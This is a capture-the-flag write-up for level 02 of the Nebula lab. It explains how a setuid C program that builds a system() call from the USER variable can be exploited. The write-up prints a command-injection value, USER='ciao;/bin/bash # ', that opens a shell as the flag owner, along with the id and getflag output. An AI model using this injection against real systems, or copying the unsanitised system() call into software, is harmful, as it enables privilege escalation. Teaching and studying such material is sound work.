# Level 02
There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the **level02** account with the password **level02**. Files for this level can be found in /home/flag02.

## Source Code

```c++
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```
## Writeup
The problem in this code is run **/bin/echo** with a environment variable **USER** without checking his content.
We can put a string inside with **;** character and the **/bin/bash** command with a comment at the end to comment the other code.

```bash
USER='ciao;/bin/bash # ' /home/flag02/flag02
```

We have now a bash with **flag02** account. We can check it with **id** command:

```bash
flag02@nebula:/home/flag02$ id
uid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02)
```

Now we can run `getflag` command:

```bash
flag02@nebula:/home/flag02$ getflag
You have successfully executed getflag on a target account
```